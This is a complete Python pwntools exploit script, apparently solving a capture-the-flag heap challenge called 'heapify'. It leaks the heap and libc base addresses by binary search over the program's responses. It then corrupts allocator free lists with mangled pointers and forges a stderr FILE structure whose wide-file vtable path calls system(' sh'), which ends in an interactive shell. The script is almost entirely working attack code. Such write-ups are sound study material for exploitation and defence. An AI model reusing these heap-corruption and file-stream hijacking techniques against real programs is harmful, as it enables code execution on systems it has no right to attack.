#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './heapify')
libc = ELF(exe.libc.path) if exe.libc else None

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def insert(priority, size, cmd=None, consolidate=False):
    io.sendlineafter(b'> ', b'1' if not consolidate else b'0'*0xfff + b'1')
    io.sendlineafter(b': ', str(size).encode())
    io.sendlineafter(b': ', str(priority).encode())
    io.sendlineafter(b': ', cmd if cmd is not None else randoms(size - 0x8).encode())

def remove():
    io.sendlineafter(b'> ', b'2')
    io.recvline()
    return io.recvline()

gdbscript = '''
init-pwndbg
c
'''.format(**locals())

io = start()

insert(0, 0x48)
remove()

with log.progress('heap_base') as p:
    lo, hi = 0x500000000, 0x5ffffffff
    iters = 0
    while hi - lo > 1:
        mid = (lo + hi) // 2
        p.status(f'iter {iters}  lo={hex(lo)} hi={hex(hi)}')
        insert(1, 0x18)
        insert(mid, 0x18, b'realflagpls')
        insert(hi, 0x18, b'realflag')
        remove()
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b': ', b'24')
        io.sendlineafter(b': ', b'-')
        io.sendlineafter(b': ', b'A' * 8)
        out = remove()
        if   b'Ok seriously' in out: lo = hi; hi *= 2
        elif b'Well since'   in out: lo = mid
        else:                        hi = mid
        remove()
        remove()
        iters += 1
    heap_base = lo << 12
    p.success(f'{hex(heap_base)}  ({iters} iters)')

with log.progress('libc.address') as p:
    lo, hi = 0x7f0000000000, 0x7fffffffffff
    iters = 0
    while hi - lo > 0x1000:
        mid = (lo + hi) // 2
        p.status(f'iter {iters}  lo={hex(lo)} hi={hex(hi)}')
        for i in range(7+1): insert(i, 0x28)
        insert(mid, 0x28, b'realflagpls')
        insert((2**64)-1, 0x28)
        for i in range(7+1): remove()
        for i in range(7):
            if i != 0: insert((2**64)-1, 0x28)
            else: insert(hi, 0x28, b'realflag', consolidate=True)
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b': ', str(0x28).encode())
        io.sendlineafter(b': ', b'-')
        io.sendlineafter(b': ', b'A' * 8)
        out = remove()
        if   b'Ok seriously' in out: lo = hi; hi *= 2
        elif b'Well since'   in out: lo = mid
        else:                        hi = mid
        for i in range(7+2): remove()
        iters += 1
    libc.address = (lo & ~0xfff) - 0x218000
    p.success(f'{hex(libc.address)}  ({iters} iters)')

insert(0xff, 0x48)
for i in range(7): insert(i, 0x48)
insert(0xffff, 0x48)
for i in range(7+2): remove()
insert(0, 0x68, p64(0x60|1)*9+p64(libc.address+0x219d30)*2)
insert(1, 0x68, p64(0x60|1)*9+p64(libc.address+0x219d30)*2)
insert(1, 0x68, p64(0x60|1)*9+p64(libc.address+0x219d30)*2)
insert(1, 0x68, consolidate=True)
remove()
remove()
remove()
remove()

priorities = [*range(0, 2), 12, 2, *range(14, 17), 3, *range(18, 25), 4, *range(26, 42), 5, *range(43, 71), 61][:35]
for i in range(len(priorities)): insert((libc.address+0x219d30)+priorities[i], 0x58, cmd=p64(0x60)+p64(0)+p64(heap_base+0xb60))
remove()
for i in range(7): insert(i, 0x48)
insert(1, 0x48)
insert(1, 0x48, p64(0)*4+p64(0x80|1)+p64((heap_base+0x80)^(heap_base>>12)))
insert(1, 0x70)
insert(1, 0x70, p64(0)*2+p64(libc.sym._IO_2_1_stderr_+0xc0)+p64(libc.sym._IO_2_1_stderr_+0x90)+p64(0)+p64(libc.sym._IO_2_1_stderr_+0x40)+p64(1)+p64(libc.sym._IO_2_1_stderr_-0x10))

fs = flat(
    {
        0x00: b"  sh",
        0x08: p64(0),
        0x20: p64(0),
        0x28: p64(1),
        0x68: libc.symbols["system"],
        0x88: libc.address+0x21ba60,
        0xA0: libc.sym._IO_2_1_stderr_-0x10,
        0xC0: p64(0),
        0xD0: libc.sym._IO_2_1_stderr_,
        0xD8: libc.symbols["_IO_wfile_jumps"],
    }, filler=b'\x00'
)

insert(1, 0x18, fs[-0x18:][:-1])
insert(1, 0x30, fs[-0x18-0x30:-0x18][:-1])
insert(1, 0x50, fs[-0x18-0x30-0x50:-0x18-0x30][:-1])
insert(1, 0x70, p64(0)+fs[:0x68][:-1])

io.sendlineafter(b'> ', b'3')
io.interactive()
